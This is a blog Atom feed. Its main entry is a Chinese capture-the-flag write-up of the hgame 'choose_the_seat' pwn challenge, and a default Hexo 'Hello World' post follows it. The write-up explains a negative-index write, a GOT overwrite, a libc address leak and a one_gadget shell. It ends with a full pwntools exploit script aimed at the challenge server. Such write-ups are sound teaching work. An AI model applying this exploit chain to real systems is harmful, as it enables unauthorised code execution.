<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>StarrySky</title>
  
  <subtitle>StarrySky</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-01-12T10:10:42.035Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>StarrySky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hgame_week1 choose_the_seat</title>
    <link href="http://example.com/2023/01/12/hgame-week1-choose-the-seat/"/>
    <id>http://example.com/2023/01/12/hgame-week1-choose-the-seat/</id>
    <published>2023-01-12T09:06:58.000Z</published>
    <updated>2023-01-12T10:10:42.035Z</updated>
    
    <content type="html"><![CDATA[<p><strong>检查保护</strong></p><p><img src="E:\PC\blog图片\hgame2\2.png" alt="2"></p><p><strong>IDA反汇编</strong></p><p><img src="E:\PC\blog图片\hgame2\7.png" alt="7"></p><p><img src="E:\PC\blog图片\hgame2\6.png" alt="6"></p><p><strong>HINTS</strong></p><p><img src="E:\PC\blog图片\hgame2\1.png" alt="1"></p><p><strong>分析：</strong></p><p><img src="E:\PC\blog图片\hgame2\12.png" alt="12"></p><p>读入v0作为数组下标，仅判断大于9的情况，而对小于0时未做限制，因此可以利用数组向上覆盖任意地址内容或定位到任意地址来泄露地址</p><p><img src="E:\PC\blog图片\hgame2\14.png" alt="14"></p><p>vuln函数最后exit（0）结束程序导致不能二次利用，所以第一步先将exit_got覆盖成vuln_addr使程序可以被二次利用</p><p><img src="E:\PC\blog图片\hgame2\13.png" alt="13"></p><p>由于使用的下标是16*v0，则计算v0：（所求地址-seats地址）&#x2F;16</p><pre><code class="python">#将exit覆盖成vulnindex1 = (exit - seat) / 16r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index1)))r.sendlineafter(&#39;please input your name\n&#39; , p64(vuln))</code></pre><p>此时可以不断利用vuln函数</p><p>linux自带ASLR地址随机化每次程序运行时函数地址都不同， 但是由于函数与libc之间的相对距离不变，所以可以间接通过泄露函数地址求libc地址</p><p><img src="E:\PC\blog图片\hgame2\11.png" alt="11"></p><p>为了不影响程序的正常运行，这里选择泄露位于main函数中不会再被用到的setbuf</p><pre><code class="python">index2 = (setbuf - seat) / 16r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index2)))r.sendlineafter(&#39;please input your name&#39; , &#39;&#39;)leak_addr = u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))li(&#39;leak_addr = &#39; + hex(leak_addr))</code></pre><p>调试计算setbuf到libc的相对距离</p><p><img src="E:\PC\blog图片\hgame2\15.png" alt="15"></p><p><img src="E:\PC\blog图片\hgame2\9.png" alt="9"></p><p>接下来就可以用泄露的setbuf地址和相对位置计算libc地址</p><pre><code class="python">#leak_addr - libc = 0x8ba0alibc_base = leak_addr - 0x8ba0a</code></pre><p>接下来就是利用one_gadget来getshell了，还是选择exit位置将其覆盖成one_gadget，这样程序运行到结束就可以getshell了</p><p><img src="E:\PC\blog图片\hgame2\4.png" alt="4"></p><p><strong>完整exp如下</strong></p><pre><code class="python">from pwn import *context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)file_name = &#39;./vuln&#39;li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll = lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug = 1if debug:    r = remote(&#39;week-1.hgame.lwsec.cn&#39;,31205)else:    r = process(file_name)elf = ELF(file_name)def dbg():    gdb.attach(r)seat = 0x4040A0exit = 0x404040vuln = 0x4011D6setbuf = 0x404020index1 = (exit - seat) / 16r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index1)))r.sendlineafter(&#39;please input your name\n&#39; , p64(vuln))index2 = (setbuf - seat) / 16r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index2)))r.sendlineafter(&#39;please input your name&#39; , &#39;&#39;)leak_addr = u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))li(&#39;leak_addr = &#39; + hex(leak_addr))#leak_addr - libc = 0x8ba0alibc_base = leak_addr - 0x8ba0a                                                                                                                      one = [0xe3afe , 0xe3b01 , 0xe3b04]one_gadget = one[1] + libc_baser.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index1)))r.sendlineafter(&#39;please input your name&#39; , p64(one_gadget))r.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;检查保护&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;E:\PC\blog图片\hgame2\2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IDA反汇编&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;E:\PC\blog图片\h</summary>
      
    
    
    
    <category term="hgame" scheme="http://example.com/categories/hgame/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="hgame" scheme="http://example.com/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/01/05/hello-world/"/>
    <id>http://example.com/2023/01/05/hello-world/</id>
    <published>2023-01-05T15:19:52.532Z</published>
    <updated>2022-11-20T07:41:56.505Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
